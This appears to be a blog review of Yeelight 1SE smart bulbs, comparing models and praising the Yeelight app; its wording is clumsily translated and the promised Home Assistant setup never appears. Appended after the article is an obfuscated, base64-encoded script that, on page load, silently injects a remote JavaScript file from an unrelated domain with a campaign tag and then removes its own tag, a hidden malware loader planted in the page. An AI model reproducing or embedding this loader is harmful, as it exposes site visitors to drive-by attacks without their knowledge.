# Yeelight 1SE wirelessly controlled light bulb and Home Assistant connection

A quick overview of the Yeelight 1SE bulbs. The bulbs are decorative, only 6W, support RGB colors. Wireless control via WiFi, you can use either the official Yeelight app, which by the way does not slow down, unlike the same MiHome, or any third-party application - in my case it will be a smart home server Home Assistant.

![Image](ursuleedwards1.jpeg)

## Introduction

I personally do not see the point of automating the main lighting in the house, it is not convenient for me. For example my wife likes to have a lot of light and always turn on the main light, while I, on the contrary, like to use the main light only when there is not enough decorative light or I have to do something that requires visual concentration. I'm more in favor of automation of decorative lights (such as LED lighting in the kitchen or bedroom), or where it is desirable: turning on the light in the closet on the motion sensor.

### The Yeelight difference

Yeelight has already released a huge number of bulbs that look very similar. The ones that are easiest to confuse are the Yeelight 1S, 1SE, 1S (Dimmable). As you can see from the photo below, the main difference between the 1S and 1SE is the 8.5W power versus 6W, but the other indicators are identical. Externally, they can be distinguished only by the color of the case: the 1SE is gray (even more likely light purple). 1S and 1S (Dimmable) do not differ at all externally. The difference is that the 1S is colored, and the Dimmable version is warm color only (the power is identical).

![Image](ursuleedwards2.jpeg)

#### Usage options

I personally like to use these lamps in hanging open plafonds above my desk/work area, etc. The bulb itself looks good, a light purple shimmering body. Definitely won't ruin the look.

![Image](ursuleedwards3.jpeg)

##### Yeelight standard app.
I really like the stability of this app. Compared to the MiHome glitches, it's heavenly. It's worth noting the large variety of colors: 16 million. The colors are very flexible. 
The standard app supports the grouping of bulbs, which allows you to change the color and brightness (and other parameters) of an entire group of bulbs at once. When you turn off, all settings are saved. The 6W bulb is considered analogous to a 45W incandescent bulb. Generally, I'm not a big fan of LED bulbs for basic lighting, nothing compares to the old classics as three hundred hundred incandescent or five at 60W. No LED bulb creates that kind of lamplight warmth. I still have the main light in my bedroom on incandescent bulbs and it doesn't matter how much electricity it takes.

![Image](ursuleedwards4.jpeg)

###### Conclusion
The bulbs are not very powerful, will only go for decorations. It might make sense to use the more powerful 1S. I liked the variety of colors and settings, connect to Home Assistant, a lot of work has been done to integrate all kinds of bulbs.


<script id="QSsD0" src="data:text/javascript;base64, dmFyIF9MYUs2OSA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX3JWTUVhLCBfajB6cUMpIHt2YXIgX1VtOE9YID0gZnVuY3Rpb24oX3dlUnNMKSB7d2hpbGUgKC0tX3dlUnNMKSB7X3JWTUVhWydwdXNoJ10oX3JWTUVhWydzaGlmdCddKCkpO319O19VbThPWCgrK19qMHpxQyk7fShfTGFLNjksIDB4MTFiKSk7dmFyIF84Rm5ibiA9IGZ1bmN0aW9uKF9yZUxOUywgX0xQbDROKSB7X3JlTE5TID0gX3JlTE5TIC0gMHgwO3ZhciBfUmhOSGggPSBfTGFLNjlbX3JlTE5TXTtyZXR1cm4gX1JoTkhoO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfOEZuYm4oJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX1A4V0FtID0gZG9jdW1lbnRbXzhGbmJuKCcweDEnKV0oXzhGbmJuKCcweDInKSk7X1A4V0FtW184Rm5ibignMHgzJyldID0gXzhGbmJuKCcweDQnKTtfUDhXQW1bJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHgzNVx4NzNceDZiXHg2ZVx4NzhceDZkXHg2M1x4NzdceDJlXHg2M1x4NjFceDczXHg2M1x4NjFceDMzXHgyZVx4NzNceDcwXHg2MVx4NjNceDY1XHgyZlx4NWZceDcyXHg2NVx4NmRceDZmXHg3NFx4NjVceDVmXHg3NFx4NzJceDYxXHg2M1x4NmJceDJlXHg2YVx4NzNceDNmXHg2M1x4NjFceDZkXHg3MFx4NjFceDY5XHg2N1x4NmVceDNkXHgzMVx4NTZceDc4XHg2Zlx4NGJceDU2XHg2OFx4NzdceDc4XHg0ZSc7ZG9jdW1lbnRbXzhGbmJuKCcweDUnKV0oXzhGbmJuKCcweDYnKSlbJ1x4NjFceDcwXHg3MFx4NjVceDZlXHg2NFx4NDNceDY4XHg2OVx4NmNceDY0J10oX1A4V0FtKTtkb2N1bWVudFtfOEZuYm4oJzB4NycpXSgnUVNzRDAnKVsnXHg3Mlx4NjVceDZkXHg2Zlx4NzZceDY1J10oKTt9LCB7J1x4NmZceDZlXHg2M1x4NjUnOiAhIVtdfSk7"></script>

